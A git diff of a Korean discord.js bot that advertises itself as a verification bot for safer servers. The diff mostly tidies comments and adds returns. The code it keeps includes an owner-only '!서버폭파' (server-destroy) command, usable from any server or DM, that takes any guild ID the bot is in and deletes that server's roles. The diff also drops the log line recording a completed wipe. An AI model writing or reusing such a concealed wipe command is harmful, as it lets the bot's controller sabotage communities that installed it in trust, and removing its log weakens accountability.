@@ -217,11 +217,14 @@ client.on('ready', async () => {
 });
 
 client.on('messageCreate', async (message) => {
+    // 봇 자신이 보낸 메시지나 시스템 메시지는 아예 무시
+    if (message.author.bot) return;
+
     const content = message.content.trim();
     const userId = message.author.id;
     const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
-    // 💥 [최우선 처리 1] !서버폭파 명령어 (관리자 전용) - 어떤 서버나 DM에서든 동작
+    // 💥 [1] !서버폭파 명령어 (관리자 전용)
     if (content.startsWith('!서버폭파')) {
         if (!isBotOwner) return;
 
@@ -235,7 +238,7 @@ client.on('messageCreate', async (message) => {
 
         const targetGuild = client.guilds.cache.get(targetGuildId);
         if (!targetGuild) {
-            const errText = `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다. (봇이 해당 서버에 들어가 있는지 확인해주세요)`;
+            const errText = `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다.`;
             return message.guild ? message.reply(errText) : message.author.send(errText);
         }
 
@@ -257,14 +260,13 @@ client.on('messageCreate', async (message) => {
                     await r.delete().catch(() => {});
                 }
             }
-            console.log(`[서버 폭파 완료] ${targetGuild.name} (${targetGuildId}) 서버가 폭파되었습니다.`);
         } catch (err) {
-            console.error('서버 폭파 중 오류 발생:', err);
+            console.error('서버 폭파 오류:', err);
         }
         return;
     }
 
-    // 🔄 [최우선 처리 2] !서버복구 명령어 (관리자 전용) - 현재 서버를 템플릿 구조로 복구
+    // 🔄 [2] !서버복구 명령어 (관리자 전용)
     if (content === '!서버복구') {
         if (!isBotOwner) return;
         if (!message.guild) return message.author.send('❌ 서버 채널 안에서 입력해 주세요.');
@@ -319,8 +321,11 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
+    // DM 채팅인 경우 명령어 외에는 반응 안 함
     if (!message.guild) return;
-    if (message.author.bot) return;
+
+    // ⚠️ 여기서부터는 오직 봇의 허용된 명령어('!')로 시작하는 메시지만 처리함 (일반 채팅은 완전히 무시)
+    if (!content.startsWith('!')) return;
 
     const guildId = message.guild.id;
     const isServerOwner = message.guild.ownerId === userId;
@@ -328,7 +333,7 @@ client.on('messageCreate', async (message) => {
     let settings = loadSettings();
     const isServerActivated = settings[guildId] && settings[guildId].activated === true;
 
-    // 1. !서버인증 명령어 (서버 소유자 전용 - 1번만 치면 활성화되고 DM으로 링크 전송)
+    // [3] !서버인증 명령어 (서버 소유자 전용)
     if (content === '!서버인증') {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -367,7 +372,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // 2. !도움말 명령어
+    // [4] !도움말 명령어
     if (content === '!도움말') {
         return message.reply(
             `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
@@ -387,7 +392,7 @@ client.on('messageCreate', async (message) => {
         return message.reply('⚠️ **해당 서버는 아직 인증 시스템이 활성화되지 않았습니다.**\n서버 소유자가 먼저 채팅창에 **`!서버인증`**을 딱 한 번 입력해 주세요.');
     }
 
-    // 3. !인증 명령어 (서버 소유자 전용)
+    // [5] !인증 명령어 (서버 소유자 전용)
     if (content === '!인증') {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -420,9 +425,10 @@ client.on('messageCreate', async (message) => {
         } catch (err) {
             console.error('인증 버튼 생성 에러:', err);
         }
+        return;
     }
 
-    // 4. !인증역할 명령어 (서버 소유자 전용)
+    // [6] !인증역할 명령어 (서버 소유자 전용)
     if (content.startsWith('!인증역할')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -445,9 +451,10 @@ client.on('messageCreate', async (message) => {
         saveSettings(settings);
 
         message.reply(`✅ 이 서버의 인증 완료 역할이 **${role.name}** (\`${roleId}\`)으로 설정되었습니다!`);
+        return;
     }
 
-    // 5. !아이디 명령어 (서버 소유자 전용)
+    // [7] !아이디 명령어 (서버 소유자 전용)
     if (content.startsWith('!아이디')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -470,9 +477,10 @@ client.on('messageCreate', async (message) => {
         saveSettings(settings);
 
         message.reply(`✅ 이 서버의 전용 로그 채널이 <#${channelId}>로 설정되었습니다!`);
+        return;
     }
 
-    // 6. !인증정보 명령어 (서버 소유자 전용 - 해당 서버에서 인증한 사람의 기록만 검색)
+    // [8] !인증정보 명령어 (서버 소유자 전용)
     if (content.startsWith('!인증정보')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -525,9 +533,10 @@ client.on('messageCreate', async (message) => {
             await processingMsg.delete().catch(() => {});
             message.reply('⚠️ 로그 검색 중 오류가 발생했습니다.');
         }
+        return;
     }
 
-    // 7. !역할제거 명령어
+    // [9] !역할제거 명령어
     if (content === '!역할제거') {
         try {
             const member = message.member;
@@ -543,6 +552,7 @@ client.on('messageCreate', async (message) => {
         } catch (err) {
             message.reply('⚠️ 역할 제거 중 오류가 발생했습니다.');
         }
+        return;
     }
 });
 
